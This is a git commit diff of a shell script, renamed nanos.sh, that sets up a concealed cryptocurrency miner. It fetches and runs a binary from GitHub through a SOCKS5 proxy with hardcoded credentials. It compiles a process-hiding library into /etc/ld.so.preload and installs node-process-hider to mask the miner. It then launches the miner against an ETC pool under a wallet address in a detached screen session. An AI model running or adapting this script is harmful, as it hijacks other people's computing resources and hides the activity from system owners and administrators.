d38ca5d9949e543af5617c64eeef2dbdc628607d
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-04-11 19:00:42 +0700

    Update and rename f2p00L.sh to nanos.sh

--- nanos.sh
+++ nanos.sh
@@ -1,19 +1,17 @@
 #!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
+sudo apt update && apt install screen -y
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+apt-get install -y nodejs
 
+npm i -g node-process-hider
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233 
-loglevel = 1 
-socks5 = 3.15.39.186:1080 
-socks5_username = mikrotik999 
-socks5_password = Elibawnos 
+listen = :2233
+loglevel = 1
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -21,33 +19,28 @@ END
 sleep .2
 
 echo " "
-
 echo " "
 
-echo "**"
+echo ""
 
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
-
 echo " "
 
-echo "**"
+echo ""
 
 echo " "
-
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/gunturyogatama404/jijij//main/bezzHash
-
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.f2pool.com:8118 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
+ph add bezzHash
+screen -dmS ls nohup ./bezzHash --url=nano_0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1000-9999 -n 1)-sty)@us-etc.2miners.com:1010 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99 > nohup.out
